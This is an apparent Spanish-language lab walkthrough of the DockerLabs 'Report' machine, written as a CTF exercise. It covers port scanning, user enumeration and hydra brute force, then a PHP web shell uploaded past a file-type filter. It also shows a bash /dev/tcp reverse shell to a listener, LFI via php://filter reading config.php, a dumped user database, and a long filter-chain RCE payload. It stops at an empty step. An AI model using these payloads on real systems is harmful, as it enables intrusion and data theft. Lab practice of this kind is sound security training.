### Report-DockerLabs🇪🇸

#### 1. Primero encendemos el laboratorio
```bash
sudo bash ./auto_deploy.sh report.tar 
```

<img width="907" height="494" alt="image" src="https://github.com/user-attachments/assets/c1b4363c-22e7-4487-8a17-a3c5371ffbfc" />


#### 1.2 Realizaremos un ping para ver si esta encendida la máquina.
```bash
ping -c3 172.17.0.2
```

<img width="905" height="236" alt="image" src="https://github.com/user-attachments/assets/b85303a0-8904-4eac-aa3f-cc3ea1c6a146" />


#### 2. Ahora realizaremos un rastreo de puertos mediante nmap.
```bash
nmap -p- -sCV 172.17.0.2
```

<img width="905" height="625" alt="image" src="https://github.com/user-attachments/assets/34f5615d-6513-4282-8496-69d46d8fcb2a" />

*Podemos apreciar que estan abiertos los puertos 22(ssh), 80(http), 3306(mariaDB)*

#### 3. Iremos al http para ver que hay.

<img width="1008" height="970" alt="image" src="https://github.com/user-attachments/assets/ffdb941d-a6fe-4146-adcc-f1df7ce32870" />

*Apreciamos que tenemos un formulario y vamos a ver si podemos hacer una inyección*


#### 3.2 Vamos a registrarnos y despues le damos al unico boton que nos aparece y derrepente nos dan los datos de un tal adam.

<img width="1015" height="756" alt="image" src="https://github.com/user-attachments/assets/5f6f61e0-3773-44f0-bf5a-630d66f8f155" />


#### 4. Realizamos un gobuster para ver los directorios ocultos.
```bash
gobuster dir -u http://realgob.dl -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 32 -x php,html,txt,zip
```

<img width="907" height="741" alt="image" src="https://github.com/user-attachments/assets/75880b1f-60ed-4761-9c4d-833af715739b" />


#### 4.2 Miraremos que dice en important.txt

<img width="1017" height="607" alt="image" src="https://github.com/user-attachments/assets/f266a389-4d9d-4eea-bfbb-c161ef795c4b" />


#### 5. Vamos a realizar ffuf de todos los usuarios del directorio de user shortlist que devuelve "contraseña incorrecta" porque si no exite el usuario devuelve "usuario no encontrado".
```bash
ffuf -u http://realgob.dl/login.php -X POST -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mr "incorrecta"
```

<img width="908" height="560" alt="image" src="https://github.com/user-attachments/assets/0d96a630-c65c-4f42-a41e-3754e0bbc573" />


#### 6. Realizaremos un hydra para obtener la contraseña a la fuerza bruta del usuario `admin`, mediante `"/admin.php:username=^USER^&password=^PASS^:F=incorrectos"` el cual se va a descubrir la contraseña de admin mediante un diccionario corto.
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/avaya_defaultpasslist.txt realgob.dl http-post-form "/admin.php:username=^USER^&password=^PASS^:F=incorrectos" -I -f
```


<img width="935" height="310" alt="image" src="https://github.com/user-attachments/assets/3d08f2ae-4c23-421e-9990-18eb9ac4d797" />


#### 7. Vamos a crear un archivo php para testear y vamos a ver si lo podemos añadir a `/cargas.php`
```bash
nano cmd.php
```

```php
<?php
        system($_GET['cmd']);
?>
```

#### 7.2 En cargas no me deja porque me pone `tipo de archivo no permitido`.


<img width="992" height="765" alt="image" src="https://github.com/user-attachments/assets/9e2f505c-41cc-4959-8ef5-8efba3aa3bb7" />
 
 *Vamos a utilizar algun programa para ver los target de la web, en mi caso utilizare burpsuite.*

#### 7.3 Vamos a mandar el método POST al intruder.

<img width="1065" height="522" alt="image" src="https://github.com/user-attachments/assets/3ce32948-7c21-488e-b071-26f960038246" />


#### 7.4 Añadimos https://git.selfmade.ninja/sertify82/SecLists/-/blob/master/Fuzzing/extensions-most-common.fuzz.txt este archivo de las extensiones mas comunes a los payloads.

<img width="923" height="451" alt="image" src="https://github.com/user-attachments/assets/82a330aa-cbf6-44c8-a7d9-e86b2f741b3c" />


#### 7.5 Vamos a asignar como posición de carga útil al content-type.

<img width="1056" height="531" alt="image" src="https://github.com/user-attachments/assets/fb584430-a30f-401a-aa96-883438417af5" />

#### 7.6 Ahora descargamos https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt para añadir a payload configuration

<img width="937" height="439" alt="image" src="https://github.com/user-attachments/assets/b37c46ff-1fe3-4366-8e8e-96bfee54f3e2" />


#### 7.7 Por último vamos a deseleccionar la casilla de URL encode.

<img width="921" height="627" alt="image" src="https://github.com/user-attachments/assets/ef2d85b2-a5b1-455f-8718-14d7fdfe40eb" />


#### 7.8 Vamos a pulsar el "start stack" y a esperar a que se realice la prueba.

<img width="1070" height="411" alt="image" src="https://github.com/user-attachments/assets/d183d212-c521-4ef6-b50e-47eb1c5ee9d1" />


#### 8. Luego vamos a `/uploads` a confirmar la subida del archivo

<img width="850" height="512" alt="image" src="https://github.com/user-attachments/assets/1a36bdc8-22c7-4ed3-9423-4a0e45ee3d36" />


#### 8.2 Después de tener el cmd comprobamos que podamos convertirla en una reverse shell.

<img width="859" height="333" alt="image" src="https://github.com/user-attachments/assets/c480fcd8-9b09-4630-865f-890cfad36434" />


#### 9 Ejecutamos la reverse shell

#### 9.1 En la web
```
http://realgob.dl/uploads/cmd.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/4444%200%3E%261%27
```

#### 9.2 En la terminal
```bash
nc -lvnp 4444
```

<img width="861" height="799" alt="image" src="https://github.com/user-attachments/assets/cc77c88e-2304-4f08-9060-a94f9f6a392c" />


#### 9.3 Vamos a ajustar la tty

```bash
script -c bash /dev/null
Cnt + Z
stty raw -echo;fg
reset xterm
www-data@574a08e159c9:/var/www/html/uploads$ export TERM=xterm
www-data@574a08e159c9:/var/www/html/uploads$  export SHELL=bash
www-data@574a08e159c9:/var/www/html/uploads$  stty rows 49 columns 210
www-data@574a08e159c9:/var/www/html/uploads$ 
```

<img width="760" height="396" alt="image" src="https://github.com/user-attachments/assets/b66e3248-2cdd-4027-8884-fb307f1c8e37" />


#### 9.4 Después de mirar varias rutas, está es interesante para entras a la base de datos.
```
http://realgob.dl/about.php?file=php://filter/convert.iconv.utf8.utf16/resource=/var/www/html/config.php
```

<img width="847" height="517" alt="image" src="https://github.com/user-attachments/assets/e43ffe87-5afb-4eb9-8042-24e04f0cdf84" />


#### 9.5 Entramos a la base de datos y realizamos un par de consultas.
```sql
─(adri㉿adri)-[~]
└─$ mysql -h 172.17.0.2 -u root -p --ssl=0   
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 267
Server version: 10.11.8-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use GOB_BD;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [GOB_BD]> select * from users;
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
| id | username | password                                                     | nombre        | apellido | email                        | dni       | direccion                                | telefono     | saldo       | no_cuenta |
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
|  1 | adan     | $2y$10$IBfPR1/zhLbcjeMz42BY/O.Qb2smhr4UYdyaet3UUvrd/txDxwHQC | Adan          | Martnez  | adan@gmail.com               | 12345678A | Calle de Ejemplo 123, Ciudad Ejemplo     | +34123456789 |       56.00 | 89542776  |
|  4 | yahir    | $2y$10$6d2LbTMyvhkloPQPUDl./e4SCDDMjp6eO9Qu62bS6C1VRkXeU501. | yahir         | lopez    | yahir23@gmail.com            | 23123     | La direccion mas prra #24 Colonia Grillo | 2325124523   |        0.00 | 96271035  |
|  5 | joaquin  | $2y$10$slvTyHz6jzbSt8Q3lejcCO3hSz/3lAZsWnH4.zJBRl83122M.zjz6 | joaquin       | guzman   | chapito@hotmail.com          | V2F9SK4   | Av Lautaro Calle Celeste #24             | 938572245    |      150.00 | 12726850  |
|  6 | Felipe   | $2y$10$fJhC6773D4IjdwtBq3JymeIRGCpGVYMZq23s7Lteq1NFeXVUhMozC | Felipe        | Calderas | calder98@gmail.com           | GS8GVS    | Colonia Centro Matamoros #232            | 728592354    |      150.00 | 74821147  |
|  7 | Eduardo  | $2y$10$Pv0A9MrBMJphE2J8t9ZZZu7f.hwq4MBq8ZRKqymAJbkF4eMAcDFey | Eduardo       | Felix    | lalomora@hotmail.com         | FG9S72K8  | Colonia Hernandez Monroy Av Eulalio #153 | 9784712841   |        7.00 | 46126168  |
|  8 | Andrea   | $2y$10$Hvr0/KwEIQQaMmUCWbXZFujw3/Zg4AGXDx2BcbFiOY0Y7IfqhURnC | Andrea        | Casas    | andycc2@gmail.com            | F9S8GKA8  | Calle Av Universal Tamaulipas Centro #85 | 8237850302   |        7.00 | 34343017  |
|  9 | vaxei    | $2y$10$IPffhz9cfTzFtRzBwFrapeare4J7HLYvfA3q/ZP8Xx9zRoBF8lQE6 | Vaxei         | Lopez    | usvaxei@gmail.com            | 938F8kG8  | Circuito del carmen #592 Bol             | 893858224    |      150.00 | 69878704  |
| 66 | admin    | $2y$10$hX7a7qAbulmNFfgmDzJEPOlxZbzR3jpdIJbyglA56C4beY923B9tO | Administrador |          | edo_administracion@gmail.com |           |                                          |              | 14030327.00 | 99999999  |
| 68 | adri     | $2y$10$.E3YLcpNh.mrHr4Byarzz.msgVTts3RZ/k7WXd5odshTK5zCDIM6q | adri          | adri     | adri@mail.com                | adri      | adri                                     | adri         |      150.00 | 55268780  |
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
9 rows in set (0,001 sec)

MariaDB [GOB_BD]> select * from transacciones;
+----+---------+---------+----------------+------------------+---------------------+---------------+
| id | user_id | monto   | cuenta_destino | descripcion      | fecha               | cuenta_origen |
+----+---------+---------+----------------+------------------+---------------------+---------------+
|  1 |      66 |   23.00 | 99999999       | pago predial     | 2024-10-14 03:37:30 |               |
|  2 |       7 |   23.00 | 99999999       | Pago Multa       | 2024-10-14 04:26:58 | 46126168      |
|  3 |       7 |  120.00 | 99999999       | Deuda Escrituras | 2024-10-14 04:29:29 | 46126168      |
|  4 |       1 |   44.00 | 99999999       | rukaleta         | 2024-10-14 04:47:10 | 89542776      |
|  5 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 04:59:49 | 89542776      |
|  6 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 05:00:29 | 89542776      |
|  7 |       1 |   50.00 | 99999999       | nomas            | 2024-10-14 05:02:11 | 89542776      |
|  8 |       1 |  123.00 | 99999999       | extra            | 2024-10-14 05:03:21 | 89542776      |
|  9 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 05:04:41 | 89542776      |
| 10 |       1 |  407.00 | 89542776       | concepto 2321    | 2024-10-14 05:04:46 | 89542776      |
| 11 |       1 |  407.00 | 89542776       | concepto 2321    | 2024-10-14 05:08:26 | 89542776      |
| 12 |       7 |    2.00 | 99999999       | rea              | 2024-10-14 05:12:41 | 46126168      |
| 13 |       8 |  123.00 | 34343017       | real             | 2024-10-14 05:15:24 | 34343017      |
| 14 |       8 |   23.00 | 34343017       | tarjeta nueva    | 2024-10-14 05:17:44 | 34343017      |
| 15 |       8 |  123.00 | 34343017       | cheves           | 2024-10-14 05:18:08 | 34343017      |
| 16 |       8 |   12.00 | 99999999       | magic            | 2024-10-14 05:27:02 | 34343017      |
| 17 |       8 |  120.00 | 99999999       | concepto chidito | 2024-10-14 05:28:04 | 34343017      |
| 18 |       8 |  123.00 | 99999999       | descri           | 2024-10-14 05:29:55 | 34343017      |
| 19 |       8 |  120.00 | 99999999       | redis            | 2024-10-14 05:31:42 | 34343017      |
+----+---------+---------+----------------+------------------+---------------------+---------------+
19 rows in set (0,002 sec)

MariaDB [GOB_BD]> 
```

#### 9.6 Vamos a utilizar el filter_Chain para pasar de cadenas a texto.
```bash
python3 php_filter_chain_generator.py --chain "<?php system('id'); ?>"
```

<img width="762" height="792" alt="image" src="https://github.com/user-attachments/assets/206e8af6-2c23-4c7e-bfaa-6fe3b13c6a39" />


#### 9.7 Indicaremos la chain en la url como si fuera un parametro file.
```
http://realgob.dl/about.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

<img width="1132" height="447" alt="image" src="https://github.com/user-attachments/assets/a02af9e7-b341-49a9-a131-35ffcfedbb6f" />


#### 9.8 Encontramos en la directorio de `/database` código interesante para seguir.

<img width="1127" height="461" alt="image" src="https://github.com/user-attachments/assets/cc813124-3e3b-4cad-9a5a-4e128806e5a7" />


#### 9.8.2 Descubrimos tambien los directorios `/api`

<img width="1139" height="458" alt="image" src="https://github.com/user-attachments/assets/2669d083-0175-4093-9729-c767e3bf436d" />

#### 10. En `http://realgob.dl/noticias.php?id=1` lo mandamos al repeater en BurpSuite.

<img width="776" height="539" alt="image" src="https://github.com/user-attachments/assets/78f0aba7-44e1-43c4-af77-cb1e29f373f3" />


#### 10.2 
